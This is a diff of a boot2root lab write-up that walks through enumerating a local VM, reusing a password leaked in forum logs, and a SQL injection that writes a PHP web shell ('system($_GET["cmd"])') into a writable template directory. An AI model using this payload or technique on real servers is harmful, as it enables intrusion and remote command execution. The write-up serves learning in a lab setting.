@@ -31,8 +31,8 @@ using **nikto -h https://192.168.56.102** we recieve few interesting dirs: **for
 
 On forum there are 4 topics and only one is iteresting, topic **Probleme login** where user **lmezard** push logs with attempts to log in.
 
-In these logs we can see, what username lmezard used trying to log in, it's **Failed password for invalid user 'username'** 
-And there is interesting username in string **Failed password for invalid user !q\]Ej?\*5K5cy\*AJ**
+In these logs we can see, what username lmezard used trying to log in, it's **"Failed password for invalid user 'username'"** 
+And there is interesting username in string **"Failed password for invalid user !q\]Ej?\*5K5cy\*AJ"**
 And, these characters came up for lmezard password.
 
 In lmezard profile we could see his email, so we go to webmail, and try the same password **!q\]Ej?\*5K5cy\*AJ** to his mail. And it's fits again.
@@ -44,7 +44,7 @@ And another way to get access to server - is SQL injection through which you can
 **(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)**
 
 ```
-* SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php' *
+SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php'
 ```
 templates_c - dir which always need write permission, used for compiled templates. I found it through **dirbuster** and brute force dirs to write access.
 
@@ -71,8 +71,8 @@ This password fit to ftp port, which contains README file - "Complete this littl
 
 ### lmezard
 File fun is archive (I found out it because of '0ustar' mark in file).
-After unzipping (* tar -xf fun *)
-There is a folder * ft_fun * with a lot of pcap files.
+After unzipping **(tar -xf fun)**
+There is a folder **ft_fun** with a lot of pcap files.
 
 These files have c code, and comments which number/line it has.
 So we need to write script which will correct concat them into c file.
